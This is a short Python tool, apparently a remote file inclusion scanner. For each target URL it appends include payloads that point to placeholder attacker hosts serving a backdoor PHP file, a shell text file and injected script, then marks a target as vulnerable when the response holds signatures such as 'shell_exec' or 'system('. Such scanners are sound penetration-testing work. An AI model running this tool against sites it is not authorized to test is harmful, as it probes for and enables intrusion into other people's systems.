import requests

class RFIFuzzer:
    def __init__(self):
        self.name = "Remote File Inclusion Fuzzer"
        self.payloads = [
            "http://example.com/shell.txt",
            "http://malicious.site/backdoor.php",
            "https://attacker.net/inject.js",
            "http://evil.org/code.txt"
        ]
        self.signatures = [
            "<script>", "shell_exec", "phpinfo()", "Hacked by", "var payload", "system("
        ]

    def run_tests(self, targets):
        results = {}
        for target in targets:
            for payload in self.payloads:
                test_url = f"{target}?file={payload}"
                status, response_text = self.send_request(test_url)
                is_vulnerable = self.analyze_response(response_text)
                results[test_url] = {
                    "status": status,
                    "vulnerable": is_vulnerable
                }
        return results

    def send_request(self, url):
        try:
            response = requests.get(url, timeout=5)
            return response.status_code, response.text[:1000]
        except requests.exceptions.RequestException:
            return "ERROR", "No response"

    def analyze_response(self, text):
        for sig in self.signatures:
            if sig in text:
                return True
        return False
